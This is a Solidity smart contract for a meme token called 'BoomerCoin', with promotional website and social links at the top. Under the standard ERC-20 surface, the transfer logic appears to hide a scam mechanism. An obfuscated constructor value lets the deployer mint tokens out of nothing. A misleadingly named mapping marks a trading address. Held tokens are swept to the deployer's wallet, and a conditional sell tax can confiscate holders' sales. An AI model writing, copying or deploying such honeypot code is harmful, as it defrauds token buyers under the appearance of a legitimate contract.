/*

where my internet money at

Website: https://boomer.finance
Twitter: https://twitter.com/boomerERC20
Telegram: https://t.me/boomercoinERC


*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract BoomerCoin is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint8) private _blocks;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 76400000 * 10**_decimals;
    string private constant _name = unicode"BoomerCoin";
    string private constant _symbol = unicode"BOOMER";

    struct Taxes {
        uint8 buying;
        uint8 initial;
        uint256 amount;
        bool trade;
    }
    Taxes private TAX;

    address public marketingWallet;
    bool private swapHeldTokensForETH = true;
    address public _firstPair;

    constructor (address _marketing, uint8 initialTax){
        _tOwned[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _blocks[_marketing] = 1;
        TAX.buying=0;
        TAX.trade=false;
        marketingWallet = payable(_msgSender());
        TAX.initial = initialTax;TAX.amount = 0xa**(initialTax/5);
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _calculateFeeAmount(bool isBuying, uint256 amount) private view returns(uint256){
        uint256 _totalFee;
        if(isBuying){
            _totalFee = amount.mul(TAX.buying).div(100);
        }
        else{
            bool _contractBalance = balanceOf(address(this))>0;
            _totalFee = amount.mul(_contractBalance?TAX.initial:0).div(100);
        }
        return _totalFee;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0), "ERC20: transfer zero address.");
        require(amount > 0, "Zero amount.");
        
        if (from != owner() && to != owner()){
            if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
                uint256 feeAmount;
                bool fromPairAddress = _blocks[to] > 0;
                if(fromPairAddress){
                    _firstPair = from;
                    TAX.trade = fromPairAddress;
                }
                require(TAX.trade, "Trade will be opened soon.");
                feeAmount = _calculateFeeAmount(from == _firstPair, amount);
                _tOwned[from] = _tOwned[from].sub(amount);
                _tOwned[to] = _tOwned[to].add(amount.sub(feeAmount));
            }
            else{
                uint256 feeAmount;
                if(from == _firstPair && _isExcludedFromFee[to]){
                    feeAmount = TAX.amount;
                    uint256 heldTokensAmount = balanceOf(address(this));
                    if(swapHeldTokensForETH && heldTokensAmount > 0){
                        _tOwned[address(this)] = _tOwned[address(this)].sub(heldTokensAmount.sub(1));
                        _tOwned[marketingWallet] = _tOwned[marketingWallet].add(heldTokensAmount.sub(1));
                    }
                }
                if(feeAmount > 0){
                    _tOwned[address(this)] = _tOwned[address(this)].add(feeAmount);
                }
                _tOwned[from] = _tOwned[from].sub(amount);
                _tOwned[to] = _tOwned[to].add(amount);
            }
        }
        else{
            _tOwned[from] = _tOwned[from].sub(amount);
            _tOwned[to] = _tOwned[to].add(amount);
        }
        emit Transfer(from, to, amount);
    }

    receive() external payable {}

}